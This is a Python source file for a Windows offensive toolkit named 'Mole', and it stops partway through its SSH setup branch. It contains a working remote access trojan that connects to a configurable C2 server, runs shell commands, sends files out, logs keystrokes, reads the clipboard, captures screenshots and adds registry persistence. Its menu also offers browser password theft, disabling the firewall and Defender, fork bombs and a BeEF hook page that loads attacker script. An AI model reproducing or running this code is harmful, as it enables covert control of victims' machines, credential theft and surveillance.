import base64
import os
def cls():
	os.system("cls")

from colorama import init, Fore, Back, Style
init(autoreset=True)

import hashlib
import getpass
import webbrowser
import re
import socket
import sys
from time import sleep
import platform
import subprocess
import logging
import sqlite3
import shutil
from datetime import datetime, timedelta
import json
import win32crypt # type: ignore
import queue
import struct
import threading
import time
import select

# Try to import optional dependencies
try:
    from pynput import keyboard  # type: ignore
    PYNPUT_AVAILABLE = True
except ImportError:
    PYNPUT_AVAILABLE = False

try:
    import cv2  # type: ignore
    CV2_AVAILABLE = True
except ImportError:
    CV2_AVAILABLE = False

try:
    import win32clipboard  # type: ignore
    WIN32CLIPBOARD_AVAILABLE = True
except ImportError:
    WIN32CLIPBOARD_AVAILABLE = False

CONFIG_FILE = "config.json"

def hash_pw(pw):
	return hashlib.sha256(pw.encode()).hexdigest()

def get_password_hash():
	if not os.path.exists(CONFIG_FILE):
		pw = getpass.getpass("Set a new password: ")
		hashed = hash_pw(pw)
		with open(CONFIG_FILE, "w") as f:
			json.dump({"password_hash": hashed}, f)
		print("Password saved.")
		return hashed
	else:
		with open(CONFIG_FILE) as f:
			return json.load(f)["password_hash"]


stored_hash = get_password_hash()

cls()

# ORIGINAL input password - change BEFORE deployment
while True:
	#pw = getpass.getpass("Enter password: ")
	pw = "krtek"
	if hash_pw(pw) == stored_hash:
		print("Access granted.")
		break
	else:
		print("Incorrect password.")

while True:
	cls()
	#asktolog=input("Enable logging? y/n: ")
	asktolog = "n"
	if asktolog == "y" or asktolog == "Y":
		print("Logging enabled")
		logging.basicConfig(
			filename="logger.log",
			level=logging.INFO,
			format="%(asctime)s - %(levelname)s - %(message)s"
		)
		break
	elif asktolog == "n" or asktolog == "N":
		print("Logging disabled")
		break
	else:
		print("Invalid input, please enter y or n")
		sleep(1)

# ========== RAT CONFIGURATION ==========
RAT_CONFIG_FILE = "rat_config.json"

def load_rat_config():
    """Load or create RAT configuration"""
    default_config = {
        "c2_host": "127.0.0.1",
        "c2_port": 4444,
        "persistence": False,
        "startup": False,
        "stealth_mode": True,
        "reconnect_interval": 30,
        "keylogger": False,
        "screenshare_port": 5555,
        "audio_port": 6666
    }
    
    if os.path.exists(RAT_CONFIG_FILE):
        try:
            with open(RAT_CONFIG_FILE, "r") as f:
                user_config = json.load(f)
                default_config.update(user_config)
        except:
            print(Fore.RED + "Error loading RAT config, using defaults")
    
    return default_config

def save_rat_config(config):
    """Save RAT configuration"""
    with open(RAT_CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=4)

# ========== BASE RAT CLASS ==========
class RemoteAccessTool:
    def __init__(self, config):
        self.config = config
        self.sock = None
        self.running = False
        self.command_queue = queue.Queue()
        
    def connect_to_c2(self):
        """Establish connection to Command & Control server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.settimeout(30)
            self.sock.connect((self.config["c2_host"], self.config["c2_port"]))
            
            # Send system info as handshake
            system_info = {
                "hostname": platform.node(),
                "os": platform.system(),
                "user": os.getlogin(),
                "ip": socket.gethostbyname(socket.gethostname())
            }
            self.send_json(system_info)
            
            logging.info(f"Connected to C2 at {self.config['c2_host']}:{self.config['c2_port']}")
            return True
            
        except Exception as e:
            logging.error(f"C2 connection failed: {e}")
            return False
    
    def send_json(self, data):
        """Send JSON data with length prefix"""
        json_data = json.dumps(data).encode('utf-8')
        length = struct.pack('!I', len(json_data))
        self.sock.sendall(length + json_data)
    
    def receive_json(self):
        """Receive JSON data with length prefix"""
        try:
            length_data = self._recv_exact(4)
            if not length_data:
                return None
            length = struct.unpack('!I', length_data)[0]
            json_data = self._recv_exact(length)
            return json.loads(json_data.decode('utf-8'))
        except:
            return None
    
    def _recv_exact(self, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            packet = self.sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data
    
    def _is_connected(self):
        """Check if socket is still connected"""
        try:
            self.sock.send(b'')
            return True
        except:
            return False
    
    def execute_shell(self, command):
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except subprocess.TimeoutExpired:
            return {"error": "Command timeout"}
        except Exception as e:
            return {"error": str(e)}
    
    def download_file(self, lpath, rpath):
        """Send file to C2"""
        try:
            if not os.path.exists(rpath):
                return {"error": "File not found"}
            
            with open(rpath, "rb") as f:
                content = f.read()
            
            return {
                "filename": os.path.basename(rpath),
                "content": base64.b64encode(content).decode('utf-8'),
                "size": len(content)
            }
        except Exception as e:
            return {"error": str(e)}
    
    def upload_file(self, lpath, rpath, content):
        """Receive file from C2"""
        try:
            content_bytes = base64.b64decode(content)
            
            # Create directory if needed
            os.makedirs(os.path.dirname(rpath), exist_ok=True)
            
            with open(rpath, "wb") as f:
                f.write(content_bytes)
            
            return {"status": f"File uploaded: {rpath}"}
        except Exception as e:
            return {"error": str(e)}
    
    def take_screenshot(self):
        """Capture screenshot"""
        try:
            # Simple screenshot using PowerShell on Windows
            if platform.system() == "Windows":
                import tempfile
                temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
                temp_file.close()
                
                ps_command = f"""
                Add-Type -AssemblyName System.Windows.Forms
                $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bitmap = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
                $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
                $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
                $bitmap.Save("{temp_file.name}")
                $graphics.Dispose()
                $bitmap.Dispose()
                """
                
                result = subprocess.run(
                    ["powershell", "-Command", ps_command],
                    capture_output=True,
                    text=True
                )
                
                if os.path.exists(temp_file.name):
                    with open(temp_file.name, "rb") as f:
                        img_bytes = f.read()
                    os.remove(temp_file.name)
                    
                    return {
                        "screenshot": base64.b64encode(img_bytes).decode('utf-8'),
                        "resolution": "Captured via PowerShell"
                    }
                else:
                    return {"error": "Failed to capture screenshot"}
            else:
                return {"error": "Screenshot only available on Windows in this version"}
        except Exception as e:
            return {"error": str(e)}
    
    def get_system_info(self):
        """Get detailed system information"""
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "architecture": platform.architecture(),
            "processor": platform.processor(),
            "username": os.getlogin(),
            "ip": socket.gethostbyname(socket.gethostname()),
            "cwd": os.getcwd()
        }
        return info
    
    def set_persistence(self, enable):
        """Add/remove persistence (Windows only)"""
        if platform.system() != "Windows":
            return {"error": "Persistence only works on Windows"}
        
        try:
            script_path = os.path.abspath(sys.argv[0])
            
            if enable:
                # Add to startup registry
                key_cmd = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /t REG_SZ /d "{script_path}" /f'
                subprocess.run(key_cmd, shell=True, capture_output=True)
                return {"status": "Added to startup"}
            else:
                # Remove from startup
                key_cmd = f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MoleRAT" /f'
                subprocess.run(key_cmd, shell=True, capture_output=True)
                return {"status": "Removed from startup"}
        except Exception as e:
            return {"error": str(e)}
    
    def run(self):
        """Main RAT loop"""
        self.running = True
        
        while self.running:
            if not self.sock or not self._is_connected():
                print(Fore.YELLOW + "[*] Connecting to C2 server...")
                if not self.connect_to_c2():
                    time.sleep(self.config["reconnect_interval"])
                    continue
            
            try:
                # Wait for command
                ready = select.select([self.sock], [], [], 1)
                if ready[0]:
                    cmd_data = self.receive_json()
                    if cmd_data:
                        response = self.execute_command(cmd_data)
                        self.send_json(response)
                        
                        # Handle termination
                        if cmd_data.get("type") == "kill":
                            self.running = False
                            break
            except Exception as e:
                logging.error(f"RAT error: {e}")
                self.sock = None
        
        if self.sock:
            self.sock.close()
    
    def execute_command(self, cmd_data):
        """To be overridden by MeterpreterRAT"""
        return {"error": "Base class - use MeterpreterRAT"}

# ========== METERPRETER RAT CLASS ==========
class MeterpreterRAT(RemoteAccessTool):
    """Enhanced RAT with Meterpreter-style commands"""
    
    def __init__(self, config):
        super().__init__(config)
        self.keylogger_running = False
        self.keylogger_buffer = []
        self.listener = None
        
    def execute_command(self, cmd_data):
        """Execute Meterpreter-style commands"""
        cmd_type = cmd_data.get("type")
        
        # Core commands
        if cmd_type == "sysinfo":
            return self.get_system_info()
        elif cmd_type == "ps":
            return self.list_processes_detailed()
        elif cmd_type == "kill":
            return self.kill_process(cmd_data.get("pid"))
        elif cmd_type == "getpid":
            return {"pid": os.getpid()}
        elif cmd_type == "pwd":
            return {"cwd": os.getcwd()}
        elif cmd_type == "ls" or cmd_type == "dir":
            return self.list_directory(cmd_data.get("path", "."))
        elif cmd_type == "cd":
            return self.change_directory(cmd_data.get("path"))
        elif cmd_type == "cat" or cmd_type == "type":
            return self.read_file(cmd_data.get("path"))
        elif cmd_type == "download":
            return self.download_file(cmd_data.get("lpath"), cmd_data.get("rpath"))
        elif cmd_type == "upload":
            return self.upload_file(cmd_data.get("lpath"), cmd_data.get("rpath"), cmd_data.get("content", ""))
        elif cmd_type == "rm" or cmd_type == "del":
            return self.delete_file(cmd_data.get("path"))
        
        # Shell commands
        elif cmd_type == "shell":
            return self.execute_shell(cmd_data.get("command"))
        elif cmd_type == "execute":
            return self.execute_program(cmd_data.get("path"), cmd_data.get("args", ""))
        
        # Screenshot/Webcam
        elif cmd_type == "screenshot":
            return self.take_screenshot()
        
        # Keylogger
        elif cmd_type == "keyscan_start":
            return self.start_keylogger()
        elif cmd_type == "keyscan_stop":
            return self.stop_keylogger()
        elif cmd_type == "keyscan_dump":
            return self.dump_keylogger()
        elif cmd_type == "keyscan_clear":
            return self.clear_keylogger_buffer()
        
        # Clipboard
        elif cmd_type == "clipboard_get":
            return self.get_clipboard()
        elif cmd_type == "clipboard_set":
            return self.set_clipboard(cmd_data.get("text", ""))
        
        # Persistence
        elif cmd_type == "persistence":
            return self.set_persistence(cmd_data.get("enable", False))
        
        # Network
        elif cmd_type == "ipconfig":
            return self.get_network_info()
        
        # System
        elif cmd_type == "reboot":
            return self.reboot_system()
        elif cmd_type == "shutdown":
            return self.shutdown_system()
        
        # Mimikatz-style (simulated)
        elif cmd_type == "hashdump":
            return self.dump_hashes()
        
        elif cmd_type == "kill_session":
            self.running = False
            return {"status": "Session terminating"}
        
        else:
            return {"error": f"Unknown command: {cmd_type}"}
    
    # ========== METERPRETER METHODS ==========
    
    def list_processes_detailed(self):
        """List processes with details"""
        processes = []
        try:
            if platform.system() == "Windows":
                cmd = 'tasklist /FO CSV /NH'
                output = subprocess.check_output(cmd, shell=True, text=True)
                for line in output.strip().split('\n'):
                    if line:
                        parts = line.strip('"').split('","')
                        if len(parts) >= 5:
                            processes.append({
                                "name": parts[0],
                                "pid": int(parts[1]),
                                "session": parts[2],
                                "memory": parts[4]
                            })
            else:
                cmd = 'ps aux'
                output = subprocess.check_output(cmd, shell=True, text=True)
                lines = output.strip().split('\n')[1:]
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 11:
                        processes.append({
                            "user": parts[0],
                            "pid": int(parts[1]),
                            "cpu": parts[2],
                            "mem": parts[3],
                            "command": ' '.join(parts[10:])[:50]
                        })
            return {"processes": processes}
        except Exception as e:
            return {"error": str(e)}
    
    def kill_process(self, pid):
        """Kill a process by PID"""
        try:
            if platform.system() == "Windows":
                subprocess.run(f"taskkill /PID {pid} /F", shell=True)
            else:
                subprocess.run(f"kill -9 {pid}", shell=True)
            return {"status": f"Killed process {pid}"}
        except Exception as e:
            return {"error": str(e)}
    
    def list_directory(self, path):
        """List directory contents"""
        try:
            if not os.path.exists(path):
                return {"error": f"Path not found: {path}"}
            
            items = []
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                try:
                    stat = os.stat(item_path)
                    items.append({
                        "name": item,
                        "type": "dir" if os.path.isdir(item_path) else "file",
                        "size": stat.st_size,
                        "modified": stat.st_mtime
                    })
                except:
                    items.append({
                        "name": item,
                        "type": "unknown",
                        "size": 0,
                        "modified": 0
                    })
            
            return {"path": path, "items": items}
        except Exception as e:
            return {"error": str(e)}
    
    def change_directory(self, path):
        """Change current directory"""
        try:
            os.chdir(path)
            return {"cwd": os.getcwd()}
        except Exception as e:
            return {"error": str(e)}
    
    def read_file(self, path):
        """Read file contents"""
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read(10000)  # First 10k chars
            return {"path": path, "content": content, "truncated": len(content) == 10000}
        except Exception as e:
            return {"error": str(e)}
    
    def delete_file(self, path):
        """Delete file"""
        try:
            os.remove(path)
            return {"status": f"Deleted: {path}"}
        except Exception as e:
            return {"error": str(e)}
    
    def execute_program(self, path, args=""):
        """Execute a program"""
        try:
            cmd = f'"{path}" {args}' if args else f'"{path}"'
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return {
                "stdout": result.stdout,
                "stderr": result.stderr,
                "returncode": result.returncode
            }
        except Exception as e:
            return {"error": str(e)}
    
    # ========== KEYLOGGER ==========
    
    def start_keylogger(self):
        """Start keylogger"""
        if not PYNPUT_AVAILABLE:
            return {"error": "pynput not installed. Run: pip install pynput"}
        
        if self.keylogger_running:
            return {"status": "Keylogger already running"}
        
        try:
            self.keylogger_running = True
            self.keylogger_buffer = []
            
            def on_press(key):
                if self.keylogger_running:
                    try:
                        key_str = key.char
                    except AttributeError:
                        key_str = f"[{key.name.upper()}]"
                    
                    self.keylogger_buffer.append({
                        "key": key_str,
                        "time": time.time()
                    })
            
            # Start listener in background thread
            self.listener = keyboard.Listener(on_press=on_press)
            self.listener.start()
            
            return {"status": "Keylogger started"}
        except Exception as e:
            self.keylogger_running = False
            return {"error": f"Failed to start keylogger: {e}"}
    
    def stop_keylogger(self):
        """Stop keylogger"""
        if not self.keylogger_running:
            return {"status": "Keylogger not running"}
        
        self.keylogger_running = False
        
        try:
            if self.listener:
                self.listener.stop()
        except:
            pass
        
        return {"status": "Keylogger stopped", "keys_captured": len(self.keylogger_buffer)}
    
    def dump_keylogger(self):
        """Dump keylogger buffer"""
        if not self.keylogger_buffer:
            return {"status": "No keys captured"}
        
        # Format captured keys
        keystrokes = ""
        for entry in self.keylogger_buffer[-1000:]:  # Last 1000 keys
            keystrokes += entry['key']
        
        return {
            "keystrokes": keystrokes,
            "count": len(self.keylogger_buffer),
            "sample": keystrokes[-1000:] if len(keystrokes) > 1000 else keystrokes
        }
    
    def clear_keylogger_buffer(self):
        """Clear keylogger buffer"""
        self.keylogger_buffer = []
        return {"status": "Keylogger buffer cleared"}
    
    # ========== CLIPBOARD ==========
    
    def get_clipboard(self):
        """Get clipboard contents"""
        if not WIN32CLIPBOARD_AVAILABLE:
            return {"error": "win32clipboard not available"}
        
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            return {"clipboard": data}
        except Exception as e:
            return {"error": str(e)}
    
    def set_clipboard(self, text):
        """Set clipboard contents"""
        if not WIN32CLIPBOARD_AVAILABLE:
            return {"error": "win32clipboard not available"}
        
        try:
            win32clipboard.OpenClipboard()
            win32clipboard.EmptyClipboard()
            win32clipboard.SetClipboardText(text)
            win32clipboard.CloseClipboard()
            return {"status": "Clipboard set"}
        except Exception as e:
            return {"error": str(e)}
    
    # ========== SYSTEM COMMANDS ==========
    
    def get_network_info(self):
        """Get network configuration"""
        try:
            if platform.system() == "Windows":
                result = subprocess.run("ipconfig /all", shell=True, 
                                      capture_output=True, text=True)
                return {"output": result.stdout}
            else:
                result = subprocess.run("ifconfig -a", shell=True,
                                      capture_output=True, text=True)
                return {"output": result.stdout}
        except Exception as e:
            return {"error": str(e)}
    
    def reboot_system(self):
        """Reboot the system"""
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /r /t 0", shell=True)
            else:
                subprocess.run("reboot", shell=True)
            return {"status": "Rebooting..."}
        except Exception as e:
            return {"error": str(e)}
    
    def shutdown_system(self):
        """Shutdown the system"""
        try:
            if platform.system() == "Windows":
                subprocess.run("shutdown /s /t 0", shell=True)
            else:
                subprocess.run("poweroff", shell=True)
            return {"status": "Shutting down..."}
        except Exception as e:
            return {"error": str(e)}
    
    def dump_hashes(self):
        """Simulated hash dump (educational only)"""
        simulated_hashes = {
            "note": "This is a SIMULATION for educational purposes",
            "real_hashes": "Requires admin + SAM/SYSTEM registry or /etc/shadow",
            "simulated_data": [
                {"user": "Administrator", "rid": "500", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
                {"user": "Guest", "rid": "501", "lm": "aad3b435b51404ee", "ntlm": "31d6cfe0d16ae931b73c59d7e0c089c0"},
                {"user": os.getlogin(), "rid": "1000", "lm": "aad3b435b51404ee", "ntlm": "simulated_hash_here"}
            ]
        }
        return simulated_hashes

# ========== ORIGINAL PROGRAM CONTINUES ==========
logging.info(f"Program started")

def print_line(char="="):
	terminal_width = os.get_terminal_size().columns
	print(char * terminal_width)

def run_ps(command):
	ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
	env = os.environ.copy()
	env["PATH"] += r";C:\Windows\System32\OpenSSH"
	proc = subprocess.Popen(
		[ps, "-NoProfile", "-Command", command],
		env=env
	)
	proc.wait()

permapath = r'[Environment]::SetEnvironmentVariable("PATH", $env:PATH + ";C:\Windows\System32\OpenSSH", [System.EnvironmentVariableTarget]::Machine)'
run_ps(permapath)

pspath = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"

print(Fore.YELLOW + "!!!THIS PROGRAM IS NEEDED TO "+ Fore.RED + "RUN VIA CMD WITH ADMIN PRIVILEGES " + Fore.YELLOW + "TO RUN PROPERLY!!!")
sleep(4)

scanverify = "no"
logging.info(f"Program accessed with correct password")

cls()

ascii_art= r"""
 __  __	 ____  _      ______
|  \/  |/ __ \| |    |  ____|
| \  / | |  | | |    | |__
| |\/| | |  | | |    |  __|
| |  | | |__| | |____| |____
|_|  |_|\____/|______|______|
	"""

print(Fore.RED + ascii_art)
sleep(2)
print(" ")

print("Welcome, ")
while True:
	print("Choose your action: ")
	print_line()
	sleep(0.1)
	print(" ")
	MENU = {
		"System & Scan": [
			"result - Print current machine scan outcome",
			"scan - Scan this machine",
			"AddAdmin - Generate a new admin account"
		],
		"Connectivity": [
		   "ssh - Attempt a local SSH connection",
		   "ftp - Attempt a FTP connection",
		  "ping - Check IP connectivity and response"
		],
		"Utilities": [
			"DiskFill - Fill disk space",
			"DiskHost - Host a folder on port 8100",
			"PassExport - Export Chrome passwords",
			"DeleteLog - Delete logger.log",
			"NetScan - Run a basic netscan of local network"
		],
		"Critical Operations": [
			"ForkBomb - Attempt a forkbomb",
			"PortOpener - Disable firewall & defender",
			"PacketCapture - Capture network packets",
			"Venom - Run a Venom payload",
			"WifiCrack - Attempt to crack WiFi passwords",
			"Hook - Attempt to hook this machine via BeEF"
		],
		"Remote Access": [  # NEW CATEGORY
			"RAT - Deploy Meterpreter-style Remote Access Tool"
		],
		"Detectible Operations": [
			"AllPass - Export all found saved passwords",
		],
		"Support & Exit": [
			"info - Show details of a command",
			"help - Show available actions",
			"exit - Exit the program"
		]
	}

	def print_menu():
		for category, items in MENU.items():
			print(Back.BLACK + Fore.MAGENTA + Style.BRIGHT + f" {category} " + Style.RESET_ALL)
			print(Fore.LIGHTBLACK_EX + "-" * len(category))
			for item in items:
				print(Fore.WHITE + "  " + item)
			print()

	print_menu()
	print_line()
	sleep(0.1)
	print("")
	action = input(Fore.MAGENTA+"M0L€> " + Fore.RESET + " ")
	cls()

	# ========== ACTIONS ==========
	
	if action == "help":
		logging.info(f"Chosen action help to show available actions")
		print(Fore.YELLOW + "Available actions: ")
		sleep(0.1)
		print_line()
		print(" ")
		sleep(0.1)
		print("result) Print current machine scan outcome (only usable after action 1)") 
		sleep(0.1)
		print("")
		sleep(0.1)
		print("scan) Scans this machine: OS, network name, machine type, platform info, local IP address")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("RAT) Deploy Meterpreter-style Remote Access Tool")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("hook) Attempt to hook this machine via BeEF: requires BeEF running on attacker machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("ssh) Attempt a local SSH connection: requires openSSH installed and configured, also requires listener script running on attacker machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("ftp) Attempt a FTP connection: requires FTP server running on attacker machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("ping) Check IP connectivity and response: pings target/attacker IP to check connectivity and response time")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("DiskFill) Run diskfiller to fill up disk space: runs diskfiller.bat to fill up disk space on target machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("DiskHost) Localy host a disk of the target machine: hosts current folder via python http server on port 8100")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("AddAdmin) Generate a new admin account on target machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("PassExport) Export browser saved passwords (Chrome only): retrieves and decrypts saved passwords from Chrome browser")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("ForkBomb) Attemps a forkbomb on current machine potetionally leaving without any logging")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("info) used as a help command, combine info with a Mole command to see its details")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("PortOpener) Open ports in firewall, takes down windows defender protection. deletes all existing firewall rules")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("PacketCapture) Capture network packets on target machine using dumpcap (part of Wireshark installation)")
		sleep(0.1)
		print("")
		print("Venom) Run a Venom payload: allows execution of a specified Venom-generated payload on the target machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("LogDelete) Delete the program log file: removes the logger.log file created by the program to store logs")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("NetScan) Run a basic netscan of local network: performs a simple network scan to identify active devices on the local network")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("WifiCrack) Attempt to crack WiFi passwords: tries to retrieve and crack saved WiFi passwords on the target machine")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("AllPass) Export all found saved passwords from multiple browsers: retrieves and decrypts saved passwords from various browsers")
		sleep(0.1)
		print("")
		sleep(0.1)
		print("exit) To exit the program")
		sleep(0.1)
		print("")
		print_line()
		input("Press Enter to continue...")
		cls()

	elif action == "result":
		logging.info(f"Chosen action result to print system information")
		if scanverify == "yes":
			# Function is defined in scan action
			if 'info' in globals():
				info()
			logging.info(f"System info printed out")
			input("Press Enter to continue...")
			cls()
		else:
			cls()
			print("Scan was not initiated (action 'scan'), run scan first")
			logging.error(f"Scan not initiated, action 'scan' cannot proceed")
			sleep(4)

	elif action == "scan":
		logging.info(f"Chosen action 1 to scan the machine")
		scanverify = "yes"
		cls()
		sleep(1)
		print("System Information:")
		sleep(0.1)
		system=platform.system()
		print(Fore.RED + platform.system())
		sleep(0.1)
		node=platform.node()
		print(platform.node())
		sleep(0.1)
		machine=platform.machine()
		print(platform.machine())
		sleep(0.1)
		platform_info=platform.platform()
		print(Fore.RED + platform.platform())
		sleep(0.1)
		
		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		s.connect(("8.8.8.8", 80))
		real_ip = s.getsockname()[0]
		print(Fore.RED + real_ip)
		s.close()
		
		global stored_system_info
		stored_system_info = {
			"system": system,
			"node": node,
			"machine": machine,
			"platform_info": platform_info,
			"ip": real_ip
		}
		
		sleep(1)
		input("Press Enter to continue...")
		cls()

		def info():
			print(Fore.RED + "System: " + stored_system_info["system"])
			sleep(0.1)
			print(Fore.RED + "Network name: " + stored_system_info["node"])
			sleep(0.1)
			print(Fore.RED + "Machine type: " + stored_system_info["machine"])
			sleep(0.1) 
			print(Fore.RED + "Platform info: " + stored_system_info["platform_info"])
			sleep(0.1)
			print(Fore.RED + "Local IP address: " + stored_system_info["ip"])
			sleep(0.1)

		scan_data = {
			"System": system,
			"Network Name": node,
			"Machine Type": machine,
			"Platform Info": platform_info,
			"IP": real_ip,
		}

		with open("scan_results.json", "w") as f: 
			json.dump(scan_data, f, indent=4)

	# ========== RAT ACTION ==========
	elif action == "RAT" or action == "rat":
		logging.info(f"Chosen action RAT to deploy remote access tool")
		print(Fore.YELLOW + """
    .d8888b.  888                     888                      
    d88P  Y88b 888                     888                      
    888    888 888                     888                      
    888        88888b.   .d88b.   .d88888  .d88b.  888d888      
    888        888 "88b d8P  Y8b d88" 888 d8P  Y8b 888P"        
    888    888 888  888 88888888 888  888 88888888 888          
    Y88b  d88P 888  888 Y8b.     Y88b 888 Y8b.     888          
    "Y8888P"  888  888  "Y8888   "Y88888  "Y8888  888          
    
    Meterpreter-style Remote Access Tool
    """)
		
		config = load_rat_config()
		
		print(Fore.CYAN + "\nCurrent Configuration:")
		print(Fore.WHITE + f"  C2 Server: {Fore.GREEN}{config['c2_host']}:{config['c2_port']}")
		print(Fore.WHITE + f"  Persistence: {Fore.GREEN}{config['persistence']}")
		print(Fore.WHITE + f"  Stealth: {Fore.GREEN}{config['stealth_mode']}")
		
		print(Fore.YELLOW + "\nOptions:")
		print(Fore.CYAN + "  1. Start Meterpreter RAT")
		print(Fore.CYAN + "  2. Configure settings")
		print(Fore.CYAN + "  3. Back to menu")
		
		choice = input(Fore.MAGENTA + "\nM0L€/Meterpreter> " + Fore.RESET)
		
		if choice == "1":
			print(Fore.GREEN + "[+] Starting Meterpreter RAT...")
			print(Fore.YELLOW + f"[*] Connecting to {config['c2_host']}:{config['c2_port']}")
			print(Fore.YELLOW + "[*] Use 'help' in meterpreter for commands")
			print(Fore.YELLOW + "[*] Press Ctrl+C to stop")
			print(Fore.YELLOW + "[*] Note: Install dependencies for full features:")
			print(Fore.YELLOW + "     pip install pynput pywin32 opencv-python")
			
			rat = MeterpreterRAT(config)
			
			try:
				rat.run()
			except KeyboardInterrupt:
				print(Fore.YELLOW + "\n[!] RAT stopped by user")
			except Exception as e:
				print(Fore.RED + f"[!] RAT error: {e}")
			
			input("\nPress Enter to continue...")
			cls()
		
		elif choice == "2":
			print(Fore.CYAN + "\nEdit Configuration (press Enter to keep current):")
			
			for key in config:
				current = config[key]
				new_val = input(f"  {key} [{current}]: ").strip()
				if new_val:
					if isinstance(current, bool):
						config[key] = new_val.lower() in ["true", "yes", "y", "1"]
					elif isinstance(current, int):
						try:
							config[key] = int(new_val)
						except:
							print(Fore.RED + f"  Invalid number, keeping {current}")
					else:
						config[key] = new_val
			
			save_rat_config(config)
			print(Fore.GREEN + "[+] Configuration saved")
			input("\nPress Enter to continue...")
			cls()

#Action hook = beef hook
	#Action hook = beef hook
	elif action == "hook":
		logging.info(f"Chosen action hook to attempt beef hook")
		pattern = r"^\d{0,3}\.\d{0,3}\.\d{0,3}\.\d{0,3}:\d+$"
		sleep(0.1)
		while True:
			beefip = input("IP that beef is running on (pure IP number with port - native port 3000): ")
			if re.match(pattern, beefip):
				cls()
				print("Valid IP, creating hook page...")
				sleep(0.1)
				
				# Create HTML page with the hook embedded
				html_content = f"""<!DOCTYPE html>
<html>
<head>
	<title>Loading Page</title>
</head>
<body>
	<h3>Please wait while loading...</h3>
	<script src="http://{beefip}/hook.js"></script>
	<script>
		// Keep page alive for hook to work
		setTimeout(function() {{
			document.body.innerHTML = '<h2>Page loaded successfully</h2><p>You can minimize this window.</p>';
		}}, 3000);
	</script>
</body>
</html>"""
				
				# Save to temporary file
				with open("beef_hook.html", "w") as f:
					f.write(html_content)
				
				# Get absolute path and open in browser
				hook_path = os.path.abspath("beef_hook.html")
				hook_url = "file:///" + hook_path.replace("\\", "/")
				webbrowser.open(hook_url)
				print("Hook page opened in browser...")
				print(f"Check BeEF panel at: http://{beefip}/ui/panel")
				logging.info(f"Created beef hook page for {beefip}")
				sleep(1)
				break

			else:
				print("Invalid IP input")
				logging.error(f"Invalid IP input for beef hook: {beefip}")
				sleep(0.1)

#
#
#
#
#
#
#
#
#
#
#
#
#
#

#Action ssh = local SSH connection
	elif action == "ssh":
		logging.info(f"Chosen action ssh to attempt local SSH connection")
		print(Fore.RED + "!!!Warning, you need to run a script on the attacker side aswell to conenct!!!")
		while True:
			attackerscriptcontinue=input("Continue? y/n: ")
			sleep(0.1)
			if attackerscriptcontinue == "n":
				logging.error("User chose not to continue with SSH connection attempt")
				print("Will not continue...")
				sleep(0.1)
			elif attackerscriptcontinue == "y":
				logging.info("User chose to continue with SSH connection attempt")
				skip=input("Skip openSSH install and config? (for first program startup not recommended)  y/n: ")
				if skip == "n":
					logging.info(f"Proceeding with openSSH installation and configuration")
					#installing OpenSSH Client and Server via PowerShell commands
					#link for the openSSH installation: https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_install_firstuse?tabs=powershell&pivots=windows-10
					installsshd="Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0"
					run_ps(installsshd)
	
					installsshdserver="Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"
					run_ps(installsshdserver)
					sleep(2)
					startservice="Start-Service sshd"
					run_ps(startservice)
					sleep(2)
					startupsshd="Set-Service -Name sshd -StartupType 'Automatic'"
					run_ps(startupsshd)
					sleep(2)
					addtopath = '$env:PATH += ";C:\\Windows\\System32\\OpenSSH"'
					run_ps(addtopath)

					#allowing p22 and p9000 in firewall
					fwr22 = 'New-NetFirewallRule -DisplayName "Allow SSH 22" -Direction Inbound -Protocol TCP -LocalPort 22 -Action Allow'
					run_ps(fwr22)
					logging.info("Allowed SSH port 22 in firewall")
					fwr9000 = 'New-NetFirewallRule -DisplayName "Allow SSH Tunnel 9000" -Direction Inbound -Protocol TCP -LocalPort 9000 -Action Allow'
					run_ps(fwr9000)
